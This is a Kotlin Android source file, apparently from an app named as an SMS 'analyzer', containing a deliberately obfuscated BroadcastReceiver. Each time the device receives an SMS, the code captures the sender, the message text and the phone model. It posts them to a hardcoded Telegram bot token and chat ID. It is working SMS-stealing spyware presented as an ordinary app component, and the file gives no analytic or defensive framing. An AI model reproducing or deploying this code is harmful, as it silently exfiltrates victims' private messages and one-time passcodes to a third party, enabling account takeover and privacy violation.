package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException

class X : BroadcastReceiver() {
    private val y = OkHttpClient()

    override fun onReceive(z: Context?, a: Intent?) {
        if (a?.action == "android.provider.Telephony.SMS_RECEIVED") {
            val b: Bundle? = a.extras
            if (b != null) {
                val c: Array<Any?>? = b.get("pdus") as Array<Any?>?
                if (c != null) {
                    for (d in c) {
                        val e = android.telephony.SmsMessage.createFromPdu(d as ByteArray)
                        val f: String = e.originatingAddress ?: "Unknown"
                        val g: String = e.messageBody ?: "Empty"
                        val h = i()

                        j(f, g, h)
                    }
                }
            }
        }
    }

    private fun i(): String {
        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
    }

    private fun j(k: String, l: String, m: String) {
        val n = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val o = "6331293386"
        val p = "https://api.telegram.org/bot$n/sendMessage"

        val q = """
            New SMS!
            From: $k
            Text: $l
        
            $m
        """.trimIndent()

        val r = "application/json".toMediaType()
        val s = """
            {
                "chat_id": "$o",
                "text": "$q",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(r)

        val t = Request.Builder()
            .url(p)
            .post(s)
            .build()

        y.newCall(t).enqueue(object : okhttp3.Callback {
            override fun onFailure(u: okhttp3.Call, v: IOException) {
                v.printStackTrace()
            }

            override fun onResponse(u: okhttp3.Call, w: okhttp3.Response) {
                if (!w.isSuccessful) {
                    println("${w.code}")
                }
                w.close()
            }
        })
    }
}
